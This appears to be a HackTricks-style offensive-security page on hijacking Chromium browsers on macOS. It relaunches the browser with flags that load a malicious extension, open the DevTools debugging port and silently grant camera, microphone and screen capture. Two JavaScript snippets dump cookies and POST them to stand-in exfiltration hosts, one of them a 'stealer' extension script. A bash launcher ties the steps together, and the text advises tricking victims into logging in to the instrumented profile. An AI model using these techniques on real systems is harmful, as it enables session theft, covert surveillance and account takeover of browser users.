# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera all consume the same command-line switches, preference files, and DevTools automation interfaces. On macOS, any user with GUI access can terminate an existing browser session and re-open it with arbitrary flags, extensions, or DevTools endpoints that run with the target's entitlements.

#### Launching Chromium with custom flags on macOS

macOS keeps a single UI instance per Chromium profile, so instrumentation normally requires force-closing the browser (for example with `osascript -e 'tell application "Google Chrome" to quit'`). Attackers typically relaunch via `open -na "Google Chrome" --args <flags>` so they can inject arguments without modifying the app bundle. Wrapping that command inside a user LaunchAgent (`~/Library/LaunchAgents/*.plist`) or login hook guarantees the tampered browser is respawned after reboot/logoff.

#### `--load-extension` Flag

The `--load-extension` flag auto-loads unpacked extensions (comma-separated paths). Pair it with `--disable-extensions-except` to block legitimate extensions while forcing only your payload to run. Malicious extensions can request high-impact permissions such as `debugger`, `webRequest`, and `cookies` to pivot into DevTools protocols, patch CSP headers, downgrade HTTPS, or exfiltrate session material as soon as the browser starts.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

These switches expose the Chrome DevTools Protocol (CDP) over TCP or a pipe so external tooling can drive the browser. Google observed widespread infostealer abuse of this interface and, beginning with Chrome 136 (March 2025), the switches are ignored for the default profile unless the browser is launched with a non-standard `--user-data-dir`. This enforces App-Bound Encryption on real profiles, but attackers can still spawn a fresh profile, coerce the victim to authenticate inside it (phishing/triage assistance), and harvest cookies, tokens, device trust states, or WebAuthn registrations via CDP.

#### `--user-data-dir` Flag

This flag redirects the entire browser profile (History, Cookies, Login Data, Preference files, etc.) to an attacker-controlled path. It is mandatory when combining modern Chrome builds with `--remote-debugging-port`, and it also keeps the tampered profile isolated so you can drop pre-populated `Preferences` or `Secure Preferences` files that disable security prompts, auto-install extensions, and change default schemes.

#### `--use-fake-ui-for-media-stream` Flag

This switch bypasses the camera/mic permission prompt so any page that calls `getUserMedia` receives access immediately. Combine it with flags such as `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, or CDP `Browser.grantPermissions` commands to silently capture audio/video, desk-share, or satisfy WebRTC permission checks without user interaction.

## Remote Debugging & DevTools Protocol Abuse

Once Chrome is relaunched with a dedicated `--user-data-dir` and `--remote-debugging-port`, you can attach over CDP (e.g., via `chrome-remote-interface`, `puppeteer`, or `playwright`) and script high-privilege workflows:

- **Cookie/session theft:** `Network.getAllCookies` and `Storage.getCookies` return HttpOnly values even when App-Bound encryption would normally block filesystem access, because CDP asks the running browser to decrypt them.
- **Permission tampering:** `Browser.grantPermissions` and `Emulation.setGeolocationOverride` let you bypass camera/mic prompts (especially when combined with `--use-fake-ui-for-media-stream`) or falsify location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` executes arbitrary JavaScript inside the active tab, enabling credential lifting, DOM patching, or injecting persistence beacons that survive navigation.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` and `Fetch.enable` intercept authenticated requests/responses in real time without touching disk artifacts.

```javascript
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Network, Runtime} = client;
  await Network.enable();
  const {cookies} = await Network.getAllCookies();
  console.log(cookies.map(c => `${c.domain}:${c.name}`));
  await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
  await client.close();
})();
```

Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:

- Silent cookie and credential theft with `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modification of site permissions (camera, microphone, geolocation) and security interstitial bypass, letting phishing pages impersonate Chrome dialogs.
- On-path tampering of TLS warnings, downloads, or WebAuthn prompts by programmatically driving `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, or `Security.handleCertificateError`.

Load the extension with `--load-extension`/`--disable-extensions-except` so no user interaction is required. A minimal background script that weaponizes the API looks like this:

```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
  if (info.status !== 'complete') return;
  chrome.debugger.attach({tabId}, '1.3', () => {
    chrome.debugger.sendCommand({tabId}, 'Network.enable');
    chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
      fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
    });
  });
});
```

The extension can also subscribe to `Debugger.paused` events to read JavaScript variables, patch inline scripts, or drop custom breakpoints that survive navigation. Because everything runs inside the user's GUI session, Gatekeeper and TCC are not triggered, making this technique ideal for malware that already achieved execution under the user context.

### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automates Chromium launches with payload extensions and exposes interactive CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Similar tooling focused on traffic interception and browser instrumentation for macOS operators.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library to script Chrome DevTools Protocol dumps (cookies, DOM, permissions) once a `--remote-debugging-port` instance is live.

### Example

```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
  --user-data-dir="$TMPDIR/chrome-privesc" \
  --remote-debugging-port=9222 \
  --load-extension="$PWD/stealer" \
  --disable-extensions-except="$PWD/stealer" \
  --use-fake-ui-for-media-stream \
  --auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```

Find more examples in the tools links.

## References

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
